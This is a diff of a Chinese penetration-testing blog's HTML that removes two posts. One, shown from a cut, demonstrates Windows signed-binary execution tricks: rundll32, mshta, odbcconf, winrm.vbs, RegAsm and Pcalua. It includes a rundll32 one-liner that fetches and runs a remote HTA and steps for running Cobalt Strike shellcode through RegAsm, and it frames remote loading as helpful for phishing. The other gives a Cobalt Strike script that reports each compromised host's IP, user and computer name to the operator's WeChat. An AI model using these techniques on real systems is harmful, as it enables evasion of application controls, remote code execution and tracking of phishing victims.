-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[InternetShortcut]</span><br><span class="line">URL&#x3D;c:\windows\system32\calc.exe</span><br></pre></td></tr></table></figure>
-
-<p> 使用rundll32加载url文件执行exe</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe ieframe.dll,OpenURL  C:\Users\jerry\Desktop\test.url</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810145839888.png" alt="image-20200810145839888"></p>
-<p><strong>如何使用rundll32执行其他脚本？</strong></p>
-<p> <strong>加载js文件</strong></p>
-<p> 首先准备一个js文件，内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WScript.Echo(&quot;1&quot;);</span><br></pre></td></tr></table></figure>
-
-<p> 使用rundll32加载js文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURL C:\Users\jerry\Desktop\test.js</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810150344638.png" alt="image-20200810150344638"></p>
-<p> <strong>加载hta文件</strong></p>
-<p> 准备一个hta文件，内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;calc.exe&quot;</span><br><span class="line">self.close</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt; </span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 使用如下命令加载hta文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURLA  C:\Users\jerry\Desktop\test.hta</span><br></pre></td></tr></table></figure>
-
-<p><strong>如何使用rundll32加载远程文件？</strong></p>
-<p> 通过调用WScript.shell组件加载mshta.exe远程加载exe命令执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:&#x2F;Windows&#x2F;System32&#x2F;mshta.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.hta&quot;,0,true);self.close();</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810151759209.png" alt="image-20200810151759209"></p>
-<h3 id="pubprn-vbs-利用失败"><a href="#pubprn-vbs-利用失败" class="headerlink" title="pubprn.vbs(利用失败)"></a>pubprn.vbs(利用失败)</h3><p> 我在windows10下测试，命令如下,提示找不到路径</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http:&#x2F;&#x2F;xxxx:8011&#x2F;test.sct</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810155430373.png" alt="image-20200810155430373"></p>
-<p> 在2012中进行测试，发现虽然会可以找到这个路径进行加载，但是不会执行sct文件。</p>
-<h3 id="Odbcconf"><a href="#Odbcconf" class="headerlink" title="Odbcconf"></a>Odbcconf</h3><p> ODBCCONF.exe是一个命令行工具，它允许您配置ODBC驱动程序和数据源名称,可能在以后的版本会删除,可以使用PowerShell命令来管理驱动程序和数据源。使用ODBCCONF可以加载任意的dll文件</p>
-<p> 首先准备一个dll文件，使用如下命令进行加载</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf.exe &#x2F;a &#123;regsvr C:\shell.dll&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810161025395.png" alt="image-20200810161025395"></p>
-<p> 需要注意生成的dll文件要和系统的版本对应，否则执行会报错</p>
-<h3 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h3><p> winrm.vbs（一个位于system32目录下的具有Windows签名的脚本文件）可以被用来调用用户定义的XSL文件，从而导致任意的、没有签名的代码执行。</p>
-<p><strong>如何利用winrm执行？</strong></p>
-<p> 首先创建一个目录，并且将cscript.exe复制到这个目录下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy c:\Windows\System32\cscript.exe xxx</span><br></pre></td></tr></table></figure>
-
-<p> 准备一个WsmPty.xsl文件，也放到该目录下，文件内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 使用如下命令运行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo C:\Windows\System32\winrm.vbs get wmicimv2&#x2F;Win32_Process?Handle&#x3D;4 -format:pretty</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810164336074.png" alt="image-20200810164336074"></p>
-<h3 id="regasm"><a href="#regasm" class="headerlink" title="regasm"></a>regasm</h3><p> RegAsm读取程序集中的元数据，并将所需项添加到注册表中。注册表允许 COM 客户端以透明方式创建 .NET Framework 类。 在注册一个类之后，任何 COM 客户端都可以像使用 COM 类一样使用它。 类仅在安装程序集时注册一次。 只有实际注册程序集中的类实例之后才能从 COM 中创建它们。</p>
-<p><strong>如何利用？</strong></p>
-<p> 首先使用CS生成一个C#的shellcode，将shellcode插入到<a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/](https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/)">文章</a>提供的模板中，使用如下命令编译运行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe &#x2F;target:library &#x2F;out:test.dll regasm.cs</span><br></pre></td></tr></table></figure>
-
-<p> 将生成的dll放置到目标主机上，使用下面的命令加载执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe &#x2F;U test.dll</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810172923452.png" alt="image-20200810172923452"></p>
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810172937554.png" alt="image-20200810172937554"></p>
-<h3 id="Pcalua"><a href="#Pcalua" class="headerlink" title="Pcalua"></a>Pcalua</h3><p> Pcalua是Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。</p>
-<p><strong>如何使用？</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pcalua -m -a calc.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810182402572.png" alt="image-20200810182402572"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> 通过上面的学习，我们可以发现在windows下能执行文件的方式挺多的，但是我们稍微区分一下可以根据是否可以远程加载文件进行区分，可以加载远程文件的方式可以对钓鱼提供某种便利</p>
-<p><strong>支持远程加载</strong></p>
-<ul>
-<li>regsvr32</li>
-<li>MSHTA</li>
-<li>CMSTP</li>
-<li>msiexec</li>
-<li>wmic</li>
-<li>msxsl</li>
-<li>WSC</li>
-<li>rundll32（通过调用其他方式远程加载）</li>
-</ul>
-<p><strong>参考</strong></p>
-<p><a href="https://pentestlab.blog/page/5/?s=applocker" target="_blank" rel="noopener">pentestlab</a></p>
-<p><a href="https://www.ired.team/offensive-security/code-execution/t1216-signed-script-ce" target="_blank" rel="noopener">ired</a></p>
-<p><a href="https://www.cnblogs.com/backlion/" target="_blank" rel="noopener">渗透测试中心</a></p>
-<p><a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://micro8.github.io/Micro8-HTML/Chapter1/71-80/72_基于白名单Installutil.exe执行payload第二季.html](https://micro8.github.io/Micro8-HTML/Chapter1/71-80/72_基于白名单Installutil.exe执行payload第二季.html)">专注 APT 攻击与防御</a></p>
-<p><a href="https://blog.csdn.net/God_XiangYu/article/details/106111296" target="_blank" rel="noopener">【免杀篇】远控免杀专题(46)-白名单IEexec.exe执行payload(VT免杀率25-69)</a></p>
-<p><a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://3gstudent.github.io/3gstudent.github.io/关于利用rundll32执行程序的分析/](https://3gstudent.github.io/3gstudent.github.io/关于利用rundll32执行程序的分析/)">关于利用rundll32执行程序的分析</a></p>
-<p><a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/](https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/)">白名单-RegAsm/RegSvcs的利用</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于CS上线微信通知的学习</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-08-01 09:30:19 / Modified: 10:37:29" itemprop="dateCreated datePublished" datetime="2020-08-01T09:30:19+08:00">2020-08-01</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">好好学习，天天向上</span><br></pre></td></tr></table></figure>
-
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    有时候渗透中我们可能需要对一些目标进行钓鱼，常用的就是使用邮件进行钓鱼，但是邮件钓鱼有一个问题，就是实时性不高，可能我们发了邮件，目标很久才会点，如果目标上线后我们没有及时进行利用或者权限维持，等我们再去看可能目标已经丢了，再想让目标点击上线已经不容易了，这就导致我们之前所做的事情功亏一篑，因此我们需要某种方法，让我们能随时知道目标是否上线，也不用一直盯着电脑。</p>
-<p>​    经过查找网上的资料，发现已经有人实现了通过server酱和CS扩展脚本来让目标上线后进行微信提醒的功能。</p>
-<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><h4 id="server酱申请"><a href="#server酱申请" class="headerlink" title="server酱申请"></a>server酱申请</h4><p><strong>什么是server酱？</strong></p>
-<p>​    简单来讲就是推送服务器警报到手机的工具。</p>
-<p><strong>怎么使用？</strong></p>
-<ol>
-<li>登入：用GitHub账号<a href="http://sc.ftqq.com/?c=github&a=login" target="_blank" rel="noopener">登入网站</a>，就能获得一个<a href="http://sc.ftqq.com/?c=code" target="_blank" rel="noopener">SCKEY</a>（在「<a href="http://sc.ftqq.com/?c=code" target="_blank" rel="noopener">发送消息</a>」页面）</li>
-<li>绑定：点击「<a href="http://sc.ftqq.com/?c=wechat&a=bind" target="_blank" rel="noopener">微信推送</a>」，扫码关注同时即可完成绑定</li>
-<li>发消息：往 <a href="http://sc.ftqq.com/SCKEY.send" target="_blank" rel="noopener">http://sc.ftqq.com/SCKEY.send</a> 发GET请求，就可以在微信里收到消息啦</li>
-</ol>
-<p><strong>绑定过程</strong></p>
-<p>​    首先我们访问<a href="http://sc.ftqq.com/?c=github&a=login" target="_blank" rel="noopener">地址</a>使用github进行授权登录，登录成功后访问<a href="http://sc.ftqq.com/?c=code" target="_blank" rel="noopener">地址</a>获取SCKEY，如下</p>
-<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094439398.png" alt="image-20200801094439398"></p>
-<p>​    然后访问<a href="http://sc.ftqq.com/?c=wechat&a=bind" target="_blank" rel="noopener">微信推送</a>扫码关注进行绑定,微信扫描后点击“检查结果并确认绑定”</p>
-<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094641509.png" alt="image-20200801094641509"></p>
-<p>​    绑定成功后界面如下：</p>
-<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094745848.png" alt="image-20200801094745848"></p>
-<p>​    绑定成功后可以访问<a href="http://sc.ftqq.com/?c=code" target="_blank" rel="noopener">地址</a>发送消息进行测试。</p>
-<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094922473.png" alt="image-20200801094922473"></p>
-<p>​    点击发送的同时，即可在微信上接收到结果。</p>
-<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801095019358.png" alt="image-20200801095019358"></p>
-<p>​    当然我们也可以调用接口来发送消息，如果是发送一个get请求，访问如下链接即可发送,这里的SCKEY是我们申请到的SCKEY,实际使用的过程中需要将其替换。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sc.ftqq.com&#x2F;SCKEY.send?text&#x3D;%E4%B8%BB%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%88%E6%8C%82%E6%8E%89%E5%95%A6~</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801095324207.png" alt="image-20200801095324207"></p>
-<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801095413716.png" alt="image-20200801095413716"></p>
-<p><strong>如何调用接口发送正文？</strong></p>
-<p>​    通过GET方式访问接口确实可以发送消息，不过使用GET发送的请求没有正文，或者说正文长度会受到长度限制，我们可以通过POST请求来进行发送，只需要添加一个desp参数即可。</p>
-<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801100120759.png" alt="image-20200801100120759"></p>
-<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801100656685.png" alt="image-20200801100656685"></p>
-<h4 id="结合CS完成上线提醒"><a href="#结合CS完成上线提醒" class="headerlink" title="结合CS完成上线提醒"></a>结合CS完成上线提醒</h4><p>​    当我们配置好server酱是不是觉得上线微信提醒非常简单呢，是的，接下来我们需要做的，就是写一个插件，当CS上线的时候，只需要提交一个POST请求，将上线的主机发送给我们就可以的，虽然说起来比较简单，但是像我这种菜水水是不会写CS插件的，幸好已经有大佬写好了插件了，代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># 循环获取所有beacon</span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"></span><br><span class="line">	sub http_get &#123;</span><br><span class="line">		local(&#39;$output&#39;);</span><br><span class="line">		$url &#x3D; [new java.net.URL: $1];</span><br><span class="line">		$stream &#x3D; [$url openStream];</span><br><span class="line">		$handle &#x3D; [SleepUtils getIOHandle: $stream, $null];</span><br><span class="line"></span><br><span class="line">		@content &#x3D; readAll($handle);</span><br><span class="line"></span><br><span class="line">		foreach $line (@content) &#123;</span><br><span class="line">			$output .&#x3D; $line . &quot;\r\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		println($output);</span><br><span class="line">	&#125;</span><br><span class="line">	#获取ip、计算机名、登录账号</span><br><span class="line">	$internalIP &#x3D; replace(beacon_info($1, &quot;internal&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">	$userName &#x3D; replace(beacon_info($1, &quot;user&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $computerName &#x3D; replace(beacon_info($1, &quot;computer&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">	</span><br><span class="line">	#get一下Server酱的链接</span><br><span class="line">	$url &#x3D; &#39;https:&#x2F;&#x2F;sc.ftqq.com&#x2F;此处填写你Server酱的SCKEY码.send?text&#x3D;CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&amp;desp&#x3D;%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0Aip:&#39;.$internalIP.&#39;%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:&#39;.$userName.&#39;%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:&#39;.$computerName;</span><br><span class="line">	</span><br><span class="line">	http_get($url);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​    我们看下代码，其实也确实非常简单，首先写了一个循环获取beacon的代码,beacon_initial方法可以理解为给新的Beacons会话添加一个自动运行的脚本，或者是让所有的新会话都运行一遍写好的脚本。当有新的会话加入就会自动加载。</p>
-<p>​    作者在beacon_initial自定义了发送get请求的函数，通过beacon_info获取一些基本的主机，最后调用接口进行发送。</p>
-<p>​    最后我们替换get请求位置的SCKEY为我们申请的key，使用CS加载插件进行测试，当设备上线的同时，我们也接收到了微信的通知。</p>
-<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801103207065.png" alt="image-20200801103207065"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    之前我认为要实现微信上线自动提醒这种功能是非常难的，但是还是有人通过这种非常简单的方式实现了这个功能，所以还是多去尝试某些东西，即使可能会失败。</p>
-<p><strong>参考文章</strong></p>
-<p><a href="http://www.nmd5.com/?p=567" target="_blank" rel="noopener">Cobalt Strike 上线微信提醒</a></p>
-<p><a href="http://sc.ftqq.com/3.version" target="_blank" rel="noopener">server酱</a></p>
-<p><a href="https://xz.aliyun.com/t/6188" target="_blank" rel="noopener">CobaltStrike插件开发官方指南 Part3</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -2334,7 +2190,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-count">38</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
